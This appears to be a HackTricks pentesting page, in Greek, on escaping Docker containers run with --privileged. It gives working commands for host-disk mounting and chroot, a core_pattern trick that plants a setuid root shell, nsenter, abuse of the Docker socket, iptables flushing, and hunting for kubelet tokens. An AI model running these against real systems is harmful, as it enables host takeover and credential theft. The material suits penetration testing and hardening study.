# Απόδραση από `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα container που ξεκινά με `--privileged` δεν είναι το ίδιο με ένα κανονικό container που διαθέτει μία ή δύο επιπλέον permissions. Στην πράξη, το `--privileged` αφαιρεί ή αποδυναμώνει αρκετές από τις προεπιλεγμένες runtime protections που κανονικά κρατούν το workload μακριά από επικίνδυνους host resources. Το ακριβές αποτέλεσμα εξακολουθεί να εξαρτάται από το runtime και τον host, αλλά για το Docker το συνηθισμένο αποτέλεσμα είναι:

- παραχωρούνται όλα τα capabilities
- καταργούνται οι περιορισμοί του device cgroup
- πολλά kernel filesystems παύουν να προσαρτώνται ως read-only
- εξαφανίζονται τα default masked procfs paths
- απενεργοποιείται το seccomp filtering
- απενεργοποιείται το AppArmor confinement
- απενεργοποιείται το SELinux isolation ή αντικαθίσταται από ένα πολύ ευρύτερο label

Η σημαντική συνέπεια είναι ότι ένα privileged container συνήθως **δεν** χρειάζεται ένα subtle kernel exploit. Σε πολλές περιπτώσεις μπορεί απλώς να αλληλεπιδράσει απευθείας με host devices, host-facing kernel filesystems ή runtime interfaces και στη συνέχεια να κάνει pivot σε host shell.

## Τι Δεν Αλλάζει Αυτόματα το `--privileged`

Το `--privileged` **δεν** κάνει αυτόματα join στα host PID, network, IPC ή UTS namespaces. Ένα privileged container μπορεί να εξακολουθεί να διαθέτει private namespaces. Αυτό σημαίνει ότι ορισμένα escape chains απαιτούν μια επιπλέον συνθήκη, όπως:

- ένα host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Αυτές οι συνθήκες είναι συχνά εύκολο να ικανοποιηθούν σε πραγματικές misconfigurations, αλλά είναι εννοιολογικά ξεχωριστές από το ίδιο το `--privileged`.

## Escape Paths

### 1. Mount του Host Disk Μέσω Exposed Devices

Ένα privileged container συνήθως βλέπει πολύ περισσότερα device nodes κάτω από το `/dev`. Αν το host block device είναι visible, η απλούστερη απόδραση είναι να το κάνει mount και να εκτελέσει `chroot` στο host filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Αν το root partition δεν είναι προφανές, κάντε πρώτα enumerate τη διάταξη των block devices:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Αν η πρακτική προσέγγιση είναι να τοποθετήσετε έναν `setuid` helper σε ένα writable host mount αντί να χρησιμοποιήσετε `chroot`, θυμηθείτε ότι δεν υποστηρίζουν όλα τα filesystem το bit `setuid`. Ένας γρήγορος host-side έλεγχος δυνατοτήτων είναι:
```bash
mount | grep -v "nosuid"
```
Αυτό είναι χρήσιμο επειδή οι εγγράψιμες διαδρομές σε filesystems `nosuid` έχουν πολύ μικρότερο ενδιαφέρον για κλασικές ροές εργασίας τύπου «τοποθέτησε ένα setuid shell και εκτέλεσέ το αργότερα».

Οι εξασθενημένες προστασίες που γίνονται αντικείμενο εκμετάλλευσης εδώ είναι:

- πλήρης έκθεση συσκευών
- ευρείες capabilities, ειδικά η `CAP_SYS_ADMIN`

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Κάνε Mount Ή Επαναχρησιμοποίησε Ένα Host Bind Mount Και Χρησιμοποίησε `chroot`

Αν το root filesystem του host είναι ήδη mounted μέσα στο container ή αν το container μπορεί να δημιουργήσει τα απαραίτητα mounts επειδή είναι privileged, ένα shell του host απέχει συχνά μόλις ένα `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Αν δεν υπάρχει bind mount του host root, αλλά το storage του host είναι προσβάσιμο, δημιουργήστε ένα:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Αυτή η διαδρομή εκμεταλλεύεται:

- αποδυναμωμένους mount περιορισμούς
- πλήρεις capabilities
- έλλειψη MAC confinement

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Εκμετάλλευση εγγράψιμων `/proc/sys` ή `/sys`

Μία από τις σημαντικές συνέπειες του `--privileged` είναι ότι οι protections των procfs και sysfs γίνονται πολύ πιο αδύναμες. Αυτό μπορεί να εκθέσει kernel interfaces που απευθύνονται στο host και κανονικά είναι masked ή mounted ως read-only.

Ένα κλασικό παράδειγμα είναι το `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Άλλες διαδρομές υψηλής αξίας περιλαμβάνουν:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Αυτή η τεχνική εκμεταλλεύεται:

- μη masked paths
- μη read-only system paths

Σχετικές σελίδες:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Χρήση Full Capabilities Για Mount- Ή Namespace-Based Escape

Ένα privileged container λαμβάνει τα capabilities που συνήθως αφαιρούνται από τα standard containers, συμπεριλαμβανομένων των `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` και πολλών άλλων. Αυτό συχνά αρκεί για τη μετατροπή ενός local foothold σε escape από το host, μόλις υπάρχει άλλη exposed επιφάνεια.

Ένα απλό παράδειγμα είναι η προσάρτηση επιπλέον filesystems και η χρήση namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Αν το host PID είναι επίσης κοινόχρηστο, το βήμα γίνεται ακόμη συντομότερο:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Αυτή η διαδρομή καταχράται:

- το προεπιλεγμένο privileged capability set
- το προαιρετικό host PID sharing

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Διαφυγή Μέσω Runtime Sockets

Ένα privileged container συχνά καταλήγει να έχει ορατά στοιχεία ή sockets του host runtime. Αν ένα Docker, containerd ή CRI-O socket είναι προσβάσιμο, η απλούστερη προσέγγιση είναι συχνά η χρήση του runtime API για την εκκίνηση ενός δεύτερου container με πρόσβαση στον host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Για το containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Αυτό το path εκμεταλλεύεται:

- privileged runtime exposure
- host bind mounts που δημιουργούνται μέσω του ίδιου του runtime

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Αφαίρεση των Παρενεργειών της Απομόνωσης Δικτύου

Το `--privileged` από μόνο του δεν εντάσσει το container στο host network namespace, αλλά αν το container διαθέτει επίσης `--network=host` ή άλλη πρόσβαση στο host network, ολόκληρο το network stack γίνεται τροποποιήσιμο:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό δεν είναι πάντα ένα άμεσο host shell, αλλά μπορεί να οδηγήσει σε denial of service, traffic interception ή πρόσβαση σε loopback-only management services.

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ανάγνωση Host Secrets και Runtime State

Ακόμη και όταν ένα clean shell escape δεν είναι άμεσα εφικτό, τα privileged containers συχνά έχουν αρκετή πρόσβαση για την ανάγνωση host secrets, κατάστασης του kubelet, runtime metadata και filesystems γειτονικών containers:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Αν το `/var` είναι mounted από το host ή οι runtime directories είναι ορατοί, αυτό μπορεί να αρκεί για lateral movement ή κλοπή cloud/Kubernetes credentials ακόμη και πριν αποκτηθεί shell στο host.

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Έλεγχοι

Σκοπός των παρακάτω commands είναι να επιβεβαιωθεί ποιες privileged-container escape families είναι άμεσα εφικτές.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Τι είναι ενδιαφέρον εδώ:

- ένα πλήρες σύνολο capabilities, ειδικά το `CAP_SYS_ADMIN`
- writable έκθεση των proc/sys
- ορατές συσκευές του host
- απουσία seccomp και MAC confinement
- runtime sockets ή bind mounts του root του host

Οποιοδήποτε από αυτά μπορεί να είναι αρκετό για post-exploitation. Αρκετά από αυτά μαζί συνήθως σημαίνουν ότι το container απέχει λειτουργικά μία ή δύο εντολές από την παραβίαση του host.

## Σχετικές σελίδες

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Αναφορές

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
